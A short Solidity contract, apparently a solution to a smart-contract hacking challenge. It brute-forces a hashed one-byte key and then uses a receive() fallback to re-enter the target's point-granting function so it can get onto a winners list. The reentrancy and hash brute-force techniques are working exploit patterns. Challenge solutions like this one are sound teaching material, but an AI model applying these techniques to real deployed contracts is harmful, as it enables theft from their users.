// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.13;

interface IChallenge {
    function passKey(uint8 _key) external;

    function getENoughPoint(string memory _name) external;

    function addYourName() external;

    function getAllwiners() external view returns (string[] memory _names);
}

contract Hack_Challenge3 {
    uint8 count = 3;
    uint8 newCount;

    function passKey(address _addr) public {
        for (uint8 i = 0; i < type(uint8).max; i++) {
            if (
                keccak256(abi.encode(i)) ==
                0xbbe3212124853f8b0084a66a2d057c2966e251e132af3691db153ab65f0d1a4d
            ) {
                IChallenge(_addr).passKey(i);
                break;
            }
        }
    }

    function getENoughPoint(address _addr, string memory _name) public {
        IChallenge(_addr).getENoughPoint(_name);
    }

    function addYourName(address _addr) public {
        IChallenge(_addr).addYourName();
    }

    receive() external payable {
        for (uint8 i = 0; i < count; i++) {
            if (count > newCount) {
                newCount++;
                getENoughPoint(msg.sender, "Pelz");
                break;
            }
        }
    }
}
